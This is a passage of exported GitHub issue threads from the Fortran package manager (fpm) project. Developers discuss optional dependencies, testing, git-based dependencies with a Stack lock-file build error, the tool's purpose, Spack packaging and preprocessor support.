            "text": "It is extremely common to have optional dependencies in Fortran projects (see the examples section at the end of this description).\nThe way Cargo handles it is described in here: https://doc.rust-lang.org/cargo/reference/specifying-dependencies.html\n[dependencies]\nfoo = { version = \"1.0\", optional = true }\nbar = { version = \"1.0\", optional = true }\n\n[features]\nfancy-feature = [\"foo\", \"bar\"]\nit seems it is somehow tied to \"features\" that one can enable somehow, but I don't yet understand the full mechanism. Also there must be some way to propagate this \"feature\" on/off status inside the code using some macros or something.\nIn Fortran, I can see at least two ways to implemented it, are there more?\n\n\nWe can define some pre-processor definitions and use #ifdef to enable certain code if an optional dependency is used. We can support multiple pre-processors (cpp, fypp, ...).\n\n\nOne can do it at the module level: I sometimes have two files, say, openmp.f90 and openmp.dum.f90 both of which implement the openmp module, so the rest of the Fortran code just use openmp no matter what, and only one of the two files is compiled and linked in the buildsystem:\n# OPENMP\nif(WITH_OPENMP)\n    set(SRC ${SRC}\n        openmp.f90\n    )\nelse()\n    set(SRC ${SRC}\n        openmp.dum.f90\n    )\nendif()\n\n\nThe advantage of 2. is that you do not have to use any pre-processor, which I try to avoid in my codes. The advantage of 1. is that it's simpler in some ways, you just put a few ifdefs in your code.\nI think fpm can support either one, or both.\nfpm could for example create some module, say optional_dependencies and export some variable or a function such as openmp_enabled for the \"openmp\" feature, that you can call in your code and make some decisions.\nEither way, we should figure out how to make fpm support optional dependencies and features that the user can configure.\nExamples\nExample 1\nA typical example is a large electronic structure code, that provides its own default exchange correlation functional, but optionally allows to link against the libxc library, in which case one must enable and link against it and some code paths are different (typically some Fortran modules are enabled / disabled) and it allows the code to use functionals from the libxc library.\nExample 2\nThere are many linear and eigensolver libraries, and there is typically some default, but if the user installs a particular 3rd party solver, it can optionally enable it in the Fortran program to use it instead.",
            "comments": [
                {
                    "user": "everythingfunctional",
                    "date": "2020-05-29 19:36:50+00:00",
                    "text": "I would lean towards option 1 as being easier to implement in fpm. It just doesn't fetch and build optional dependencies unless specified, and only defines the environment variables for the ones specified.\nWith option 2, the build process has to be able to make decisions about which source file gets used to satisfy a given module. This requires us to modify/extend our current naming conventions with regards to source file name and module name.\nI definitely see the need for such a feature, and I think we should definitely try and tackle this at some point."
                }
            ]
        },
        {
            "number": 83,
            "user": "certik",
            "date": "2020-05-24 00:56:44+00:00",
            "title": "Add tests",
            "text": "Currently the new fpm does not seem to have any tests. We have to fix it, and start adding lots of tests.\nIn the old fpm, I had two initial tests:\nhttps://github.com/fortran-lang/fpm/tree/master/archive/tests\nAnd we need to add a lot more. The idea would be to test any configuration that is supported, and that way we can ensure that it works and things don't break when new functionality is implemented.\nFurthermore, if we decide to use a different language for the production implementation, the tests will allow us to ensure that the new implementation works as expected.",
            "comments": [
                {
                    "user": "awvwgk",
                    "date": "2020-12-09 21:54:40+00:00",
                    "text": "This should be resolved with the current status of CI testing."
                }
            ]
        },
        {
            "number": 82,
            "user": "everythingfunctional",
            "date": "2020-05-23 17:35:14+00:00",
            "title": "Enable dependencies",
            "text": "This makes working with git dependencies possible!\nSee an example project I create here.\nIt's still very raw, but should work for a lot of situations.",
            "comments": [
                {
                    "user": "milancurcic",
                    "date": "2020-05-23 19:40:39+00:00",
                    "text": "Great, I'm excited to play with it.\n\nIt's still very raw, but should work for a lot of situations.\n\nAt this time, do you know what situations don't work?"
                },
                {
                    "user": "certik",
                    "date": "2020-05-24 01:00:15+00:00",
                    "text": "Great work, thanks for adding this Brad!\nWe really need to start adding tests for every PR, see #83.\nFor this particular PR, what is the best way to test this? It might be quite hard to setup a test server and download using it, all automatically when running tests. The way I was thinking we can test this is to add support for specifying a dependency that lives on a local filesystem. That way we can simply test it locally, without setting up some test servers."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-05-24 03:19:07+00:00",
                    "text": "@milancurcic , I think it may still have an issue trying to build if there is a circular dependency. You'll probably hit an infinite loop. But I haven't tested that.\n@certik , Agreed. I'm thinking of going ahead and adding path dependencies, and then yes, you can just test it locally. Really the only way to test whether stuff that needs to go over the network works is to let it go over the network. Otherwise you have to figure out how to supply a \"dummy network\" when working under tests.\nI think at this point, the best tests are going to be beta testers. I'm going to try and migrate a few of my projects to use it and see how it goes. Long term we could take the Rust/Cargo approach and just try to build all the libraries in the registry with every new version. Not sure how feasible that is, but it would at least guarantee we never break any existing packages."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-05-24 16:10:30+00:00",
                    "text": "I'm getting a stack error building this:\n$ git clone https://github.com/everythingfunctional/fpm -b EnableDependencies\nCloning into 'fpm'...\nremote: Enumerating objects: 172, done.\nremote: Counting objects: 100% (172/172), done.\nremote: Compressing objects: 100% (108/108), done.\nremote: Total 718 (delta 69), reused 132 (delta 45), pack-reused 546\nReceiving objects: 100% (718/718), 123.66 KiB | 981.00 KiB/s, done.\nResolving deltas: 100% (303/303), done.\n$ cd fpm/\n$ stack build\nAeson exception:\nError in $.packages[0].completed: failed to parse field 'packages': failed to parse field 'completed': Could not parse a UnresolvedPackageLocationImmutable from: Object (fromList [(\"name\",String \"tomland\"),(\"version\",String \"1.3.0.0\"),(\"git\",String \"https://github.com/kowainik/tomland.git\"),(\"pantry-tree\",Object (fromList [(\"size\",Number 5000.0),(\"sha256\",String \"68d6f9a3e4c20cc4645374b30000017a75c4ab1c131590538edad2ea0e4a53bd\")])),(\"commit\",String \"536a5e6ffb148d0dd4e4c4b120913a6744097676\")])\n\nMaster builds fine. I poked around a little bit and found that if I remove stack.yaml.lock, stack build works as expected.\nShould stack.yaml.lock then be removed from the repo?\nOtherwise, it works great. I made a simple program that fetches datetime and prints current time on the screen:\n$ cat fpm.toml \nname = \"current-time\"\n\n[dependencies]\ndatetime = {git = \"https://github.com/wavebitscientific/datetime-fortran\"}\n$ cat app/main.f90 \nuse datetime_module, only: datetime\ntype(datetime) :: a\na =  a % now()\nprint *, a % strftime('%d %B %Y %H:%M:%S')\nend"
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-05-25 02:09:30+00:00",
                    "text": "I'm getting a stack error building this:\n$ git clone https://github.com/everythingfunctional/fpm -b EnableDependencies\nCloning into 'fpm'...\nremote: Enumerating objects: 172, done.\nremote: Counting objects: 100% (172/172), done.\nremote: Compressing objects: 100% (108/108), done.\nremote: Total 718 (delta 69), reused 132 (delta 45), pack-reused 546\nReceiving objects: 100% (718/718), 123.66 KiB | 981.00 KiB/s, done.\nResolving deltas: 100% (303/303), done.\n$ cd fpm/\n$ stack build\nAeson exception:\nError in $.packages[0].completed: failed to parse field 'packages': failed to parse field 'completed': Could not parse a UnresolvedPackageLocationImmutable from: Object (fromList [(\"name\",String \"tomland\"),(\"version\",String \"1.3.0.0\"),(\"git\",String \"https://github.com/kowainik/tomland.git\"),(\"pantry-tree\",Object (fromList [(\"size\",Number 5000.0),(\"sha256\",String \"68d6f9a3e4c20cc4645374b30000017a75c4ab1c131590538edad2ea0e4a53bd\")])),(\"commit\",String \"536a5e6ffb148d0dd4e4c4b120913a6744097676\")])\n\nMaster builds fine. I poked around a little bit and found that if I remove stack.yaml.lock, stack build works as expected.\nShould stack.yaml.lock then be removed from the repo?\nOtherwise, it works great. I made a simple program that fetches datetime and prints current time on the screen:\n$ cat fpm.toml \nname = \"current-time\"\n\n[dependencies]\ndatetime = {git = \"https://github.com/wavebitscientific/datetime-fortran\"}\n$ cat app/main.f90 \nuse datetime_module, only: datetime\ntype(datetime) :: a\na =  a % now()\nprint *, a % strftime('%d %B %Y %H:%M:%S')\nend\n\n\nThat's odd. stack.yaml.lock is supposed to ensure that exactly the same dependency versions get used for everybody. It looks like something went funky with the specific version of tomland that I specified. What is the difference in that file after you removed it and rebuilt?"
                },
                {
                    "user": "milancurcic",
                    "date": "2020-05-25 18:02:06+00:00",
                    "text": "$ diff stack.yaml.lock stack.yaml.lock.orig \n8,10d7\n<     cabal-file:\n<       size: 6802\n<       sha256: 85568a0280115b6e9a9f263cf4cfc72ad5a6eaeb2412875816adb82ea6a405bc\n\nstack.yaml.lock.orig is the one checked out from the repo. stack.yaml.lock is the one generated by stack build.\nI don't understand how is this related to the specific tomland version \ud83d\ude15\nFWIW, I reproduced this on Fedora 28 and Ubuntu 18.10."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-05-25 18:44:08+00:00",
                    "text": "It looks like the difference in the files is in the tomland section, and the error message you got mentions tomland. So that's where the problem is, but I'm still not sure why. I'm on Arch running version 2.3.1 of stack. Maybe the format/info in the stack.yaml.lock versions has changed slightly?\nI can remove it for now, since things work without it."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-05-25 18:55:22+00:00",
                    "text": "Sounds good, this can be merged IMO."
                },
                {
                    "user": "certik",
                    "date": "2020-05-25 19:02:22+00:00",
                    "text": "Here is the error that I am getting with d89214b on Ubuntu 18.04:\n$ stack build\nAeson exception:\nError in $.packages[0].completed: failed to parse field 'packages': failed to parse field 'completed': Could not parse a UnresolvedPackageLocationImmutable from: Object (fromList [(\"name\",String \"tomland\"),(\"version\",String \"1.3.0.0\"),(\"git\",String \"https://github.com/kowainik/tomland.git\"),(\"pantry-tree\",Object (fromList [(\"size\",Number 5000.0),(\"sha256\",String \"68d6f9a3e4c20cc4645374b30000017a75c4ab1c131590538edad2ea0e4a53bd\")])),(\"commit\",String \"536a5e6ffb148d0dd4e4c4b120913a6744097676\")])\n\nWith 1cb711d things build fine.\nThe lock file, at least for Rust, is supposed to be checked into git for applications but not libraries. fpm would be an application."
                },
                {
                    "user": "certik",
                    "date": "2020-05-25 19:03:20+00:00",
                    "text": "As a side note, since fpm is following the same design as Stack and Cargo: I want fpm's error messages to be much nicer and more user friendly than the above exception that Stack gives. :)"
                },
                {
                    "user": "LKedward",
                    "date": "2020-05-25 19:28:13+00:00",
                    "text": "Aren't you are supposed to recommit the lock file whenever you add/update dependencies - @everythingfunctional is the tomland dependency new in this PR?"
                },
                {
                    "user": "certik",
                    "date": "2020-05-25 19:31:17+00:00",
                    "text": "Yes, you are supposed to regenerate it when dependencies change. The tomlang dep seems to be new here?\nhttps://github.com/fortran-lang/fpm/pull/82/files#diff-fafd0cdcd559a7b124cc61c29413fb54R42"
                },
                {
                    "user": "certik",
                    "date": "2020-05-25 19:34:39+00:00",
                    "text": "When I commit the new lock file that got generated for me, and diff the old one, here is what I get:\n$ git diff d89214b\ndiff --git a/stack.yaml.lock b/stack.yaml.lock\nindex 31e0c19..15bfc22 100644\n--- a/stack.yaml.lock\n+++ b/stack.yaml.lock\n@@ -5,6 +5,9 @@\n \n packages:\n - completed:\n+    cabal-file:\n+      size: 6802\n+      sha256: 85568a0280115b6e9a9f263cf4cfc72ad5a6eaeb2412875816adb82ea6a405bc\n     name: tomland\n     version: 1.3.0.0\n     git: https://github.com/kowainik/tomland.git\nFurthermore, when I remove those 3 lines by hand, I get the exception above.\nFrom this I conclude that the lock file should be committed, and it should contain the above 3 lines."
                },
                {
                    "user": "certik",
                    "date": "2020-05-25 19:42:19+00:00",
                    "text": "I pushed in the lock file again. Things work on my machine and tests pass at the CI.\n@everythingfunctional can you verify that things work on your machine also with the latest commit 3613167?"
                },
                {
                    "user": "LKedward",
                    "date": "2020-05-25 19:51:50+00:00",
                    "text": "Any ideas why the CI tests were not affected by this lock file problem?"
                },
                {
                    "user": "certik",
                    "date": "2020-05-25 20:07:51+00:00",
                    "text": "Any ideas why the CI tests were not affected by this lock file problem?\n\nExactly, this worries me too that our CI passed even though the lock file was broken. Possibly the CI uses a different Haskell version?"
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-05-25 20:56:23+00:00",
                    "text": "I suspect my machine and the CI are using a newer version of stack, which does not need those 3 lines in the stack.yaml.lock file. @certik , your latest push does work on my machine.\nYes, the .lock file should generally be checked in to version control. It's generally ignored for dependencies, (i.e. if a library has this file, when you include it as a dependency, that file doesn't even get looked at). It's purpose is to avoid having to consider different versions of dependencies when trying to diagnose \"works on my machine\" type issues. Stack is able to make sure you're using the exact same dependencies of everything your project uses, including the version of GHC (the Haskell compiler), except for the version of Stack itself. It seems to me that's the only possible explanation here.\n@LKedward , the dependency on tomland isn't new here, but I had to implement some new functionality in that library, and it hasn't made it to an official release yet, so I had to specify it as a git dependency. That part is new here."
                },
                {
                    "user": "certik",
                    "date": "2020-05-28 20:43:47+00:00",
                    "text": "Thanks for merging."
                }
            ]
        },
        {
            "number": 81,
            "user": "ShamanTcler",
            "date": "2020-05-19 12:59:23+00:00",
            "title": "Understanding intent",
            "text": "This is more of a discussion than an issue.\nAs a developer who routinely develops in FORTRAN and  C, I have come across Conan, http://conan.io a C/C++ package manager.\nNow in my mind C and FORTRAN are very similar in character ... both have attributes such as:\n\ncompilers\n\ncompiler vendors\ncompiler versions\ncompiler flags\n\n\nbitness (32 vs 64)\ndebug/release builds\n\nEtc.\nConan manages these very well via a hash assigned to the package.\nNow I tried about two years ago to implement a similar scheme, to what Conan was doing but finally said ... they just do it better.\nToday I use VS Code, CMake/Ninja and Conan as my \"best practice\". ( BTW, the new Ninja version 10.  native support for FORTRAN modules ) This set up supports Intel FORTRAN/GFORTRAN and hopefully FLANG soon\nSo I am curious what do you think you bring new to the table.\nPlease don't think I am just throwing stones ... I have hundreds of thousands of lines of FORTRAN code, and Conan is bit of a \"force fit\", but not bad,  ... so I truly am looking to improve my best practice.",
            "comments": [
                {
                    "user": "milancurcic",
                    "date": "2020-05-19 13:42:12+00:00",
                    "text": "Hi @ShamanTcler and welcome! Thank you for starting this discussion.\nHere's an excerpt from an email I sent to colleagues a few days ago. It's my answer to your question.\nfpm solves the (1) user and (2) developer experience problem. I don't think it solves any technical problem. How it's implemented under the hood is details, and there are many different roads we can take. But in the design of fpm we focus on UI and UX.\n\nUser experience: Once fpm is installed, all that the user has to do is fpm build, fpm run, fpm test, or fpm install. This is by far the simplest UI for Fortran out there, and is aligned to what Cargo does (we designed it after Cargo exactly with UX in mind). So the only friction comes down to installing fpm. If we make this seamless--single binary executable to download--then we'll have reduced the friction to near minimum.\n\nThe key solution for here is that the user doesn't have to a) download the source code by hand; b) edit any build files; and c) download and build any dependencies by hand.\n\nDeveloper experience: See this doc that describes the layout of an fpm package. As you can see, we take the sane default approach like Cargo where we assume a package layout and file and module naming conventions. So the developer has to remember/learn only where to put the files and how to name them. As far as I'm aware, this is the simplest developer UI for Fortran out there. Plus, the developer also gets the perk from the user experience above, which is that dependencies are automatically downloaded, built, and linked for you.\n\nAs you know, there are tools that collectively do all of the stuff that I described. However, there's no single tool that does all of what we want, and no more. Most tools were designed and intended as \"the one build system/package manager to rule them all\". They all fail because this is an extremely difficult problem. They also tend to be language agnostic (or at least support several different languages), so they necessarily have to be more general and handle more edge cases, which means more complex, and more complicated for the user.\nAnother great developer recently said \"we don't need another language-specific tool\". I think that's exactly what we need. Language-agnostic is what makes a tool become either too general and complex, or the design gets out of hand to reach all its objectives. Cargo is perfect for Rust. We need Cargo for Fortran.\nThere's also a cultural and aesthetic aspect that people rarely bring up. It's very difficult to convince a community of developers to adopt exclusively Conda, CMake, Meson, Ninja, or whatever. Conda is maybe becoming a household name in scientific Python community, but CMake is far from being a household name for Fortran. If there's a household name for Fortran, that would maybe be autotools + Make, and that's just Linux. Yes, I'm mixing up build systems and package managers here, but I'm trying to make a point, which is that we need a household name. We need a tool that, when a newcomer to Fortran visits fortran-lang.org, we can tell them here is the one tool you should use. This will only work if we have mass buy in from the community, and I think we can do this more easily if we build a Fortran-specific build system + package manager in a single tool, than trying to adopt multiple external tools.\nIt's easy for you and me and most people here to say \"why do you need this when there are already tools X, Y, and Z\". I consider myself technically literate, and I'd walk away from a project if it asked me to install Meson or Ninja. I've walked away before from Python packages that only had the Conda install instruction, and were not installable by pip. That's just me. Now imagine how it is for somebody new to Fortran, not to mention somebody new to programming.\nWe are targeting Fortran users across all skill levels, and especially the entry level programmers. I think it's crucial for Fortran that a new programmer who learns Fortran as their first language, loves the experience and is not scared off.\nThe Fortran build system + package manager must be at least as easy (and should be easier) to install and use, than it is to install and use the compiler directly.\n\nTake a look at Fortran Discourse. I think it's the perfect format for discussions like this."
                },
                {
                    "user": "ShamanTcler",
                    "date": "2020-05-19 14:42:45+00:00",
                    "text": "Thanks for the link to \"FORTRAN Discourse\" ... already joined. ( user CandL there)\nI see mention of FORTRANCon  ... good 'ole Steve Lionel is the key note, should be a good show.\nYour comment \"I consider myself technically literate, and I'd walk away from a project if it asked me to install Meson or Ninja.\" leaves me a bit perplexed ... at least regarding Ninja. I am sure this could lead to an interesting evening over a few adult beverages of your choice.\nBut I agree the discourse area is a better spot for this discussion. Thanks for your time and consideration.\nRegards\nCarl"
                },
                {
                    "user": "milancurcic",
                    "date": "2020-05-19 15:22:40+00:00",
                    "text": "Your comment \"I consider myself technically literate, and I'd walk away from a project if it asked me to install Meson or Ninja.\" leaves me a bit perplexed ... at least regarding Ninja.\n\nYes, a bit of a hyperbole. If I need the project to get work done, sure. If I'm just playing, I'd pass. From Ninja's landing page, I'm not clear how it can help me. From the manual, it sounds like a faster Make. So, a tool for power users.\n\nI am sure this could lead to an interesting evening over a few adult beverages of your choice.\n\nI hope we get a chance to do it soon! :)"
                }
            ]
        },
        {
            "number": 80,
            "user": "milancurcic",
            "date": "2020-05-17 20:20:24+00:00",
            "title": "Install dependencies from remote git URLs",
            "text": "As discussed in #33, let's allow installing fpm-enabled packages form their git repositories.\nIf the following is placed in fpm.toml:\n[dependencies]\ndependency_name = { git = git_url, tag = git_tag }\nThen the package depends on dependency_name, which fpm will fetch from git_url and a specific git tag git_tag.\nHere's a concrete example that will work, when this issue is implemented.\n[dependencies]\ndatetime = { git = \"https://github.com/wavebitscientific/datetime-fortran\", tag = \"v1.7.0\" }\nQuestion: If tag is omitted, should fpm fetch from the latest commit on master? I think so. Cargo does it like that as well. Then you could also do:\n[dependencies]\ndatetime = { git = \"https://github.com/wavebitscientific/datetime-fortran\" }",
            "comments": [
                {
                    "user": "everythingfunctional",
                    "date": "2020-05-17 20:23:03+00:00",
                    "text": "This is exactly my plan."
                },
                {
                    "user": "certik",
                    "date": "2020-05-17 21:05:04+00:00",
                    "text": "Yes, if tag is omitted, it should check out the latest master.\nOtherwise I agree."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-06-01 17:46:14+00:00",
                    "text": "This was finished in #85"
                }
            ]
        },
        {
            "number": 79,
            "user": "certik",
            "date": "2020-05-14 19:48:36+00:00",
            "title": "Easily create a Spack package",
            "text": "This issue is similar to #70 but for Spack instead of Conda. Essentially for people that use Spack (myself included sometimes), it would be nice to just be able to spack install any fpm package.\nTo do that, fpm should be able to take any package and produce a working Spack package out of it, that can then be submitted to Spack.\nThe generated Spack package would probably call fpm underneath to do the build.",
            "comments": [
                {
                    "user": "awvwgk",
                    "date": "2021-02-03 23:09:06+00:00",
                    "text": "I haven't used spack yet, but was always tempted to try it (the somewhat second-class support for my favorite build system, meson, hold me back so far). From what I got so far about spack it seems similar to homebrew, in the way that package files are not written in a configuration language or DSL, but in Python (like formulas in homebrew are written in Ruby) and the main packages are stored inside the package manager's monolithic repository.\nHow can we actually create a package for spack with fpm? First, this would require to have fpm as spack package first, wouldn't it? It might be easier to follow #69 and just use spack's support for CMake to build any fpm project instead."
                },
                {
                    "user": "certik",
                    "date": "2021-02-04 16:39:14+00:00",
                    "text": "@awvwgk there are multiple ways this can be achieved, I don't know yet the best way forward. I think our requirements are:\n\nWork with upstream fpm packages (say stdlib, f-toml, etc.) with their upstream sources (whether git or tarball) without the need to host a separate spack specific tarball\nWe submit the package to Spack, so there will be a Python formula for it, just like other Spack packages\n\nIt looks like we have at least two paths forward:\nOption 1\nThe Spack formula calls fpm to build the package ---- Spack itself handles downloading of the tarball (or git) and unpacking it, as well as building all dependencies. But fpm could be used from the Spack formula, we would have to probably implement some command line options to tell it where spack put all the dependencies (presumably also built with fpm underneath), then fpm would build the current package and hand it over to Spack.\nOption 2\nThe Spack formula would call fpm to generate a CMake based build system, and then it would just call cmake. The issues how to find dependencies would be similar (if not identical) to Option 1.\n\nAs such, we just have to get started and get it figured out one way or another, and if some extra arguments for fpm have to be implemented, then we can do it."
                },
                {
                    "user": "awvwgk",
                    "date": "2021-09-05 22:05:10+00:00",
                    "text": "Will take a stab at writing a spack package for fpm. Once we have this it should be easy to package any fpm project in spack without extra effort in fpm."
                },
                {
                    "user": "awvwgk",
                    "date": "2021-09-06 11:22:29+00:00",
                    "text": "Fpm is now available in spack develop branch: spack/spack#25799"
                },
                {
                    "user": "certik",
                    "date": "2021-09-06 14:22:44+00:00",
                    "text": "Note that to fix this issue, I am imagining something like fpm --create-spack-package and it will take the current fpm package in the current directory, and spit out the spack Python file that can be used with Spack to build it."
                }
            ]
        },
        {
            "number": 78,
            "user": "LKedward",
            "date": "2020-05-12 12:35:32+00:00",
            "title": "Preprocessor support",
            "text": "This issue is to ask whether fpm will have any built-in support for preprocessing and how this might look.\nI bring this up since I noticed that stdlib is listed in #17 under 'Pure Fortran', however it requires the fypp preprocessor to build from repo source.",
            "comments": [
                {
                    "user": "everythingfunctional",
                    "date": "2020-05-12 14:18:26+00:00",
                    "text": "We've had discussions about it. I believe we decided we want to settle on a preprocessor, and just always use it. I'd have to go find that discussion, but I believe we settled on fypp."
                },
                {
                    "user": "certik",
                    "date": "2020-05-12 14:49:08+00:00",
                    "text": "Yes, we definitely want fpm to apply a preprocessor. We also talked about file extensions, and it seems most people would prefer to just stick with .f90, and fpm would apply the preprocessor appropriately (via a compiler option or otherwise).\nWe probably should support both cpp and fypp. For fypp we should further provide a fast C++ implementation, so that we don't have to depend on Python."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-05-12 15:23:04+00:00",
                    "text": "\ud83d\udc4d on both cpp and fypp. cpp is de facto standard and many Fortran projects rely on it. fypp we have established earlier that it is more powerful than cpp and thus useful for generation of specific procedures like those in stdlib.\n\nFor fypp we should further provide a fast C++ implementation, so that we don't have to depend on Python.\n\nI agree, although this is a non-issue until fpm itself is Fortran or C++. Python ships out of the box on most systems."
                },
                {
                    "user": "certik",
                    "date": "2020-05-12 15:33:39+00:00",
                    "text": "I agree, although this is a non-issue until fpm itself is Fortran or C++.\n\nActually it's an issue for distributing fpm, as we cannot easily integrate fypp into the fpm single binary, so we now have to ship it along side fpm somehow, etc.\nHowever, since we will eventually use Conda for the non Fortran dependencies, then fypp can just be installed using Conda / Mamba, and then indeed it should become a non-issue."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-12-27 23:04:02+00:00",
                    "text": "So is there any interest in a Fortran-based version of fpp? Without macro support I think it would be simple to convert\npfpp to look like fpp(1), albeit there are varients of fpp(1) to be sure. Adding macros would be considerably more effort.  Adding basic templating based on looping or cacheing and substitution would probably be easier than macros. It would not be as powerful as some but not looking to recreate m4(1). But for basic if/else/elseif/endif preprocessing it works well. Combined with fpm setting a few variables in a standard way like OSTYPE and COMPILER and COMPILER_VERSION it could ship with fpm and only require a Fortran compiler. I am thinking it would just handle user-end pre-processing, not expand the code on the backend so it would handle \"cpp\"-like functions and assume the files were already expanded via fypp or whatever before-hand so that all that remained were .F and .F90 files with #if/#else/#elif/#endif/#ifdef/#ifndef directives."
                },
                {
                    "user": "ivan-pi",
                    "date": "2020-12-28 01:27:54+00:00",
                    "text": "I definitely think having a Fortran based preprocessor that can be tweaked as desired is appealing. Have you compared your preprocessor to the list of behaviors compiled by the flang developers: https://github.com/llvm/llvm-project/blob/master/flang/docs/Preprocessing.md?\nIf anyone is interested I also uploaded the Sun Microsystems Fortran preprocessor to GitHub: https://github.com/ivan-pi/fdfpp\nThe original code can be found on netlib. I have made no attempts to run it."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-12-29 02:45:48+00:00",
                    "text": "Making pfpp support macros and some of the other issues there is more effort than it is worth without stronger interest I suppose. Interesting list.  The main problem seemed to be to emulate cpp without the issues that cpp has, and then some added\na few features to fix other issues with pre-processing Fortran like resultant line length and others did not and so on. I had run across a few issues with fpp commands not being the same but did not know it varied that much. Looks like I would have hit more if I had not started using my own."
                },
                {
                    "user": "LKedward",
                    "date": "2020-12-29 12:09:14+00:00",
                    "text": "+1 for a Fortran-based preprocessor, however as pointed out by Ivan, there is notoriously poor portability due to variation among Fortran preprocessor implementations. This is the primary reason for me avoiding preprocessors with Fortran. With that said I am quite impressed by what can be achieved with fypp.\nI wonder whether there is interest in developing a community-agreed standard for preprocessing Fortran. Failure of previous standardisation efforts shouldn't preclude this."
                },
                {
                    "user": "ivan-pi",
                    "date": "2020-12-29 14:02:43+00:00",
                    "text": "I am also quite satisfied by what can be done with fypp (even if the syntax is quite verbose). However, I am not sure if Ondrej's suggestion to have a Fortran / C++ version of fypp is feasible. At least some elements of the fypp preprocessor language are tightly coupled to Python, e.g. one can call Python functions directly.\nCertainly, fpm is an excellent place to experiment with new preprocessing constructs. As long as the intermediate (standard-conforming) \".f90\" files are recoverable one can use it portably across compilers. On a personal level however, I will rather direct my efforts in other areas first."
                },
                {
                    "user": "ivan-pi",
                    "date": "2021-10-17 18:20:27+00:00",
                    "text": "Could a plugin based approach like suggested in #211  also be used to implement support of various preprocessors (this issue, #308,  #469)?\nA list of Fortran preprocessors can be found at the Fortran Wiki. My feeling is that overall the opinions are too divided to settle on any single one of them.\nThe cpp/fpp preprocessors which are currently the de-facto standard are too limited for some tasks, but still used heavily in practice. The younger \"tech-savvy\" Fortran users prefer fypp as a more complete solution. On the other hand, in recent discussions at Discourse several users expressed their irritation about having to install Python to use fypp.\nPreprocessor plugins could be offered as fpm dependency packages. Then everyone could just use the preprocessor he likes best.\nThe Intel Fortran compiler offers something similar with the -fpp-name compiler flag. This allows user to supply their own custom preprocessors, by using a command like this (I haven't tested it):\nifort -fpp-name=fypp -Qoption,fpp,\"--line-length=132\" [..]\n\nwhere the quoted text are the options passed to fypp. The -D (define) and -I (include directory) options are forwarded automatically. The compiler then spawns a sub-command with the following signature:\nfypp [[-D<define>]..] [[-I<include>]..] --line-length=132 [..]\n\nOutput from the preprocessor goes to stdout and is captured for any further processing.\nI know @certik has suggested in a few places we embed a preprocessor with fpm, but I was wondering lately whether an extensible plugin model fits the diversity of Fortran preprocessing needs better. One negative aspect of this approach, is that instead of joining forces to build a single reliable preprocessor that covers most needs, we'd essentially remain with the current pool of (flawed) tools (no offense meant to Fortran preprocessor developers)."
                },
                {
                    "user": "awvwgk",
                    "date": "2021-10-17 18:43:21+00:00",
                    "text": "We should implement a general preprocessing stage in fpm, this would allow native support of custom preprocessor as well. This requires a separate target processing stage before the source parsing to ensure we correctly generate the preprocessed source files as build artifacts. Otherwise our module dependencies might be inaccurate.\nThere is some demand on this beyond supporting fypp or other custom preprocessors. I recently talked with @robertrueger for supporting the FTL with fpm, there we have to deal with module names that are generated by the C preprocessor and therefore it currently can't be integrated with fpm.\nHaving a fypp-like preprocessor implemented in a compiled language is a secondary concern IMO, first we have to ensure that fpm is ready to use any preprocessor."
                },
                {
                    "user": "ivan-pi",
                    "date": "2021-10-17 20:57:28+00:00",
                    "text": "I agree with the need for a general preprocessing stage. The recent post by @urbanjost at Discourse also supports a preprocessing stage which is agnostic to the actual tool used for the source transformation.\nA few comments about preprocessing were left in #191. The two options discussed briefly were:\n\nShould preprocessor invocation be tied to the source file extension (e.g. .F or .F90 will use the built in cpp/fpp preprocessor, .fypp gets preprocessed by fypp)?\nShould preprocessor usage be mutually exclusive?  (one preprocessor per project)\n\nMy own answer to both questions would be no; support of different file extensions and their meaning varies greatly between compilers (see #250). I can imagine cases where different preprocessors could be useful for different purposes.\nWhat are the other dimensions/design questions that need to be considered?\n\nIn #250 (comment) separation between \"built-in\" and \"external\" preprocessors was suggested.\nShould it be possible to chain preprocessors? (this doesn't work if the preprocessors share tokens)"
                },
                {
                    "user": "certik",
                    "date": "2021-10-18 03:55:38+00:00",
                    "text": "I agree not to tie it to the extension. Also, I saw one code at github that uses both fypp and the c preprocessor, so no to the second question as well.\nThe only issue is with location information and good error messages. I figured out that you can separate the preprocessor but you need to provide mappings, which are just a few 1D arrays that designate intervals in the original and preprocessed code, and you can have a few interval types.\nThe question then becomes, if fpm does the preprocessing, how can it communicate to the compiler so that the compiler returns good error messages? The #line directives is a good start, but the mapping above is better. We should hand over such mapping to compilers that support it (e.g., I am happy to accept such mapping in LFortran), and then the compiler can give good error messages.\nAlternatively, the compiler can hand over the error messages to fpm for fpm to display, after remapping it itself. I don't know how much of this stuff fpm should be doing. It seems this is best left to the compiler to display error messages."
                },
                {
                    "user": "ivan-pi",
                    "date": "2021-10-18 10:02:54+00:00",
                    "text": "Are you still able to find the code that uses both fypp and the built-in preprocessor? Maybe @aradi can comment on this? I kind of doubt there is something the C preprocessor can do that can't be achieved with fypp. But I can imagine some convoluted use of preprocessing preprocessor directives... My second guess would be a scientific code which grows organically over years/decades, and the developers don't have the resources (or need) to go back and refactor it to use a newer preprocessor.\nI had not thought about the error issue so far. I kind of like the first idea, of passing the interval mapping to the compiler (maybe a scratch file is more suitable for large files). If the response to the LFortran prototype is good we can start lobbying other compilers to include a similar mechanism (or submit patches). Maybe we can brainstorm further in a issue at the LFortran repo?"
                },
                {
                    "user": "certik",
                    "date": "2021-10-18 18:15:11+00:00",
